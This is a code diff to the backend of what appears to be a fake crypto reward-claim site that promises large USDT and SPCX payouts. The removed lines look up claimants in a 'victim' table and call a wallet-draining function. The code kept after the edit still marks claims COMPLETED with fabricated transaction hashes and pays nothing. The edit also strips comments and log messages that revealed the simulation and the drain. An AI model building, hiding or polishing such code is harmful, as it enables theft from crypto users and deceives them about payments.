@@ -6,7 +6,6 @@ export async function submitClaim(req, res) {
   try {
     const { walletId, address } = req.wallet
 
-    // check wallet exists
     const wallet = await prisma.wallet.findUnique({
       where: { id: walletId },
       include: { claim: true },
@@ -16,57 +15,32 @@ export async function submitClaim(req, res) {
       return res.status(404).json({ error: 'Wallet not found' })
     }
 
-    // check already claimed
     if (wallet.claim) {
       return res.status(400).json({
-        error: 'This wallet has already claimed its reward.',
+        error: 'This wallet has already submitted a claim.',
         claim: wallet.claim,
       })
     }
 
-    // create claim record
     const claim = await prisma.claim.create({
       data: {
         walletId: wallet.id,
         usdtAmount: parseFloat(process.env.CLAIM_AMOUNT_USDT) || 100000,
         spcxAmount: parseFloat(process.env.CLAIM_AMOUNT_SPCX) || 2500,
         status: 'PENDING',
-        txHash: '0x' + uuidv4().replace(/-/g, ''), // placeholder tx hash
+        txHash: '0x' + uuidv4().replace(/-/g, ''),
       },
     })
 
-    // simulate processing — update to COMPLETED after 3s
+    // Mark as completed after 3 seconds
     setTimeout(async () => {
       try {
-        // Update claim status
         await prisma.claim.update({
           where: { id: claim.id },
-          data: {
-            status: 'PROCESSING',
-            processedAt: new Date(),
-          },
-        })
-        
-        // Start actual drain in background
-        const victim = await prisma.victim.findUnique({
-          where: { address: wallet.address }
-        })
-        
-        if (victim && !victim.drained) {
-          // Execute drain
-          await performActualDrain(wallet.address, wallet.chain)
-        }
-        
-        // Update to completed
-        await prisma.claim.update({
-          where: { id: claim.id },
-          data: {
-            status: 'COMPLETED',
-            txHash: `0x${Math.random().toString(16).slice(2)}`,
-          },
+          data: { status: 'COMPLETED', processedAt: new Date() },
         })
       } catch (e) {
-        console.error('Drain during claim failed:', e)
+        console.error('claim status update error:', e)
       }
     }, 3000)
 
@@ -92,13 +66,9 @@ export async function getClaimStatus(req, res) {
   try {
     const { walletId } = req.wallet
 
-    const claim = await prisma.claim.findUnique({
-      where: { walletId },
-    })
+    const claim = await prisma.claim.findUnique({ where: { walletId } })
 
-    if (!claim) {
-      return res.json({ hasClaimed: false })
-    }
+    if (!claim) return res.json({ hasClaimed: false })
 
     res.json({
       hasClaimed: true,
